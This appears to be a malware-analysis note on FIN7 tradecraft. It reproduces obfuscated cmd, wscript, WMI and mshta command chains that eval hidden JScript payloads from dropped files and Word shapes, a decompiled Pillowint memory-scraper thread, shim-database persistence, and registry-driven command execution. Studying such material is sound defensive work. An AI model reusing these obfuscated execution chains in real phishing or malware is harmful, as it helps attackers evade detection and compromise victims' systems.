# FIN7

## Features

1. Phishing files can be confused by executing system commands in many ways.

```bash
cmd.exe /k "SET a01=wscr& SET a02=ipt&&call %a01%%a02% /e:jscript //b %TEMP%\errors.txt
//Splice into wscript execution
cmd.exe /c wscript.exe //b /e:jscript %TEMP%\crashpad.ini
//Use cmd to call wscript.exe to execute
wscript.exe //b /e:jscript %TEMP%\debug.txt
//Execute using wscript.exe
@set w=wsc@ript /b /e:js@cript %HOMEPATH%\tt.txt
@echo try{var fs=new ActiveXObject('Scripting.FileSystemObject');sh=new ActiveXObject('Wscript.Shell');p=sh.ExpandEnvironmentStrings('%%HOM'+'EPATH%%')+'\\pp.txt';var f=fs.OpenTextFile(p,1,false);for(i=0;i^<4;i++)f.SkipLine();var com='';while(!f.AtEndOfStream)com+=f.ReadLine().substr(1);f.Close();try{fs.DeleteFile(p, true);}catch(e){}this[String.fromCharCode(101)+'v'+'al'](com);}catch(e){}; >%HOMEPATH%\tt.txt
@copy /y %TMP%\unlock.cmd %HOMEPATH%\pp.txt
@echo %w:@=%|cmd
//After confusion, execute the command in the unlock.cmd batch file
wmic.exe process call create "cmd start /min cmd /c for /f \"usebackq delims=\" %x in (`FindStr /R /C:\"@#[0-9]#@\" \"%TEMP%\unlock.doc.lnk\"`) do %x|cmd >nul 2>&1 &"
//Execute using WMI no file format
cmd.exe /S /D /c" echo /*@#8#@*/try{sh=new ActiveXObject("Wscript.Shell");fs=new ActiveXObject("Scripting.FileSystemObject");p=sh.ExpandEnvironmentStrings("%TM"+"P%");f=fs.GetFile(p+"//unlock.doc.lnk");s=f.OpenAsTextStream(1,0);c=s.Read(2403);c=s.ReadAll();s.Close();this[String.fromCharCode(101)+'va'+'l'](c);}catch(e){} >%HOMEPATH%\t.txt  & wscript //b /e:jscript %HOMEPATH%\t.txt  >nul 2>&1 &"
//After the cmd executes the confusion, the command calls wscript to execute the contents of the unlock.doc.lnk file
mshta.exe "try{jelo = 'try{w=GetObject("","Wor"+"d.Application");this[String.fromCharCode(101)+\\'va\\'+\\'l\\'](w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text);}catch(e){};';var fso = new ActiveXObject("Scripting.FileSystemObject");var sh = new ActiveXObject("Wscript.Shell");var p = sh.ExpandEnvironmentStrings("%HOMEPATH%") + "\\\\jelo.txt""
//Use mshta to bypass
cmd.exe /C set x=wsc@ript /e:js@cript %HOMEPATH%\ttt.txt & echo try{w=GetObject("","Wor"+"d.Application");this[String.fromCharCode(101)+'va'+'l'](w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text);}catch(e){}; >%HOMEPATH%\ttt.txt & echo %x:@=%|cmd
//Simple splicing bypass
%WINDIR%\System32\Wscript.exe %TEMP%\AdobeUpdateManagementTool.vbs
%WINDIR%\System32\Wscript.exe %TEMP%\WindowsUpdate_X24532\beginer.vbs
//Environment variable bypass execution
```

2.Pillowint malware maintains persistence through Shim database installation: sdbinst.exe - q - p sdb4F19.sdb. The malware will sleep for 10 seconds before calling the thread.

```C
DWORD __stdcall MemoryScraperThread(LPVOID lpThreadParameter)
{
int v1;
HANDLE v2;
Sleep(10000u);  //Sleep for 10 seconds
v1= *(&nPriority + *(_DWORD *)(g_priorityIdx + 36));
v2 = GetcurrentThread();
  SetThreadPriority(v2, v1);
  call_back_f(CCMemoryScraper);  //Running callback of thread function
  return 0;
}
```

3. Malware will read the registry when executing system commands:HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces command value execute command，Or from %WinDir%\<system32 or sysnative>\sysvols\commands.txt execute command in file.
